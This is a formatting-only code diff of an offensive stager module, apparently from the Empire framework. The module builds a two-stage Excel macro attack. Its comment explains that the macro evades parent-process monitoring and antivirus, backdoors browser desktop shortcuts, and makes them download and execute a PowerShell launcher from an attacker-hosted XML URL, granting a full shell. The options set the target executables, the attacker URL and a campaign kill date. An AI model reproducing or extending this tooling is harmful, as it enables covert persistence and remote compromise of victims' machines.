@@ -17,80 +17,76 @@ class Stager:
 
             'Comments': ['Two-stage macro attack vector used for bypassing tools that perform monitor parent processes and flag / block process launches from unexpected programs, such as office. The initial run of the macro is vbscript and spawns no child processes, instead it backdoors targeted shortcuts on the users desktop to do a direct run of powershell next time they are clicked.  The second step occurs when the user clicks on the shortcut, the powershell download stub that runs will attempt to download & execute an empire launcher from an xml file hosted on a pre-defined webserver, which will in turn grant a full shell.  Credits to @harmJ0y and @enigma0x3 for designing the macro stager that this was originally based on, @subTee for research pertaining to the xml.xmldocument cradle, and @curi0usJack for info on using cell embeds to evade AV.']
         }
-	#random name our xml will default to in stager options
-	xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(5,9)))
+        xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(5,9)))
 
         # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Listener': {
+                'Description': 'Listener to generate stager for.',
+                'Required': True,
+                'Value': '',
             },
-            'Language' : {
-                'Description'   :   'Language of the launcher to generate.',
-                'Required'      :   True,
-                'Value'         :   'powershell'
+            'Language': {
+                'Description': 'Language of the launcher to generate.',
+                'Required': True,
+                'Value': 'powershell',
             },
-	    'TargetEXEs' : {
-                'Description'   :   'Will backdoor .lnk files pointing to selected executables (do not include .exe extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,chrome',
-                'Required'      :   True,
-                'Value'         :   'iexplore,firefox,chrome'
+            'TargetEXEs': {
+                'Description': 'Will backdoor .lnk files pointing to selected executables (do not include .exe extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,chrome',
+                'Required': True,
+                'Value': 'iexplore,firefox,chrome',
             },
-            'XmlUrl' : {
-                'Description'   :   'remotely-accessible URL to access the XML containing launcher code. Please try and keep this URL short, as it must fit in the given 1024 chars for args along with all other logic - default options typically allow for 100-200 chars of extra space, depending on targeted exe',
-                'Required'      :   True,
-                'Value'         :   "http://" + helpers.lhost() + "/"+xmlVar+".xml"
+            'XmlUrl': {
+                'Description': 'remotely-accessible URL to access the XML containing launcher code. Please try and keep this URL short, as it must fit in the given 1024 chars for args along with all other logic - default options typically allow for 100-200 chars of extra space, depending on targeted exe',
+                'Required': True,
+                'Value': f"http://{helpers.lhost()}/{xmlVar}.xml",
             },
-            'XlsOutFile' : {
-                'Description'   :   'XLS (incompatible with xlsx/xlsm) file to output stager payload to. If document does not exist / cannot be found a new file will be created',
-                'Required'      :   True,
-                'Value'         :   '/tmp/default.xls'
+            'XlsOutFile': {
+                'Description': 'XLS (incompatible with xlsx/xlsm) file to output stager payload to. If document does not exist / cannot be found a new file will be created',
+                'Required': True,
+                'Value': '/tmp/default.xls',
             },
-            'OutFile' : {
-                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
-                'Required'      :   False,
-                'Value'         :   '/tmp/macro'
+            'OutFile': {
+                'Description': 'File to output macro to, otherwise displayed on the screen.',
+                'Required': False,
+                'Value': '/tmp/macro',
             },
-	    'XmlOutFile' : {
-                'Description'   :   'Local path + file to output xml to.',
-                'Required'      :   True,
-                'Value'         :   '/var/www/html/'+xmlVar+'.xml'
+            'XmlOutFile': {
+                'Description': 'Local path + file to output xml to.',
+                'Required': True,
+                'Value': f'/var/www/html/{xmlVar}.xml',
             },
-	    'KillDate' : {
-                'Description'   :   'Date after which the initial powershell stub will no longer attempt to download and execute code, set this for the end of your campaign / engagement. Format mm/dd/yyyy',
-                'Required'      :   True,
-                'Value'         :   datetime.datetime.now().strftime("%m/%d/%Y")
+            'KillDate': {
+                'Description': 'Date after which the initial powershell stub will no longer attempt to download and execute code, set this for the end of your campaign / engagement. Format mm/dd/yyyy',
+                'Required': True,
+                'Value': datetime.datetime.now().strftime("%m/%d/%Y"),
             },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other) (2nd stage).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'UserAgent': {
+                'Description': 'User-agent string to use for the staging request (default, none, or other) (2nd stage).',
+                'Required': False,
+                'Value': 'default',
             },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other) (2nd stage).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'Proxy': {
+                'Description': 'Proxy to use for request (default, none, or other) (2nd stage).',
+                'Required': False,
+                'Value': 'default',
             },
- 	    'StagerRetries' : {
-                'Description'   :   'Times for the stager to retry connecting (2nd stage).',
-                'Required'      :   False,
-                'Value'         :   '0'
+            'StagerRetries': {
+                'Description': 'Times for the stager to retry connecting (2nd stage).',
+                'Required': False,
+                'Value': '0',
             },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other) (2nd stage).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            }
-
+            'ProxyCreds': {
+                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other) (2nd stage).',
+                'Required': False,
+                'Value': 'default',
+            },
         }
 
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-        
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
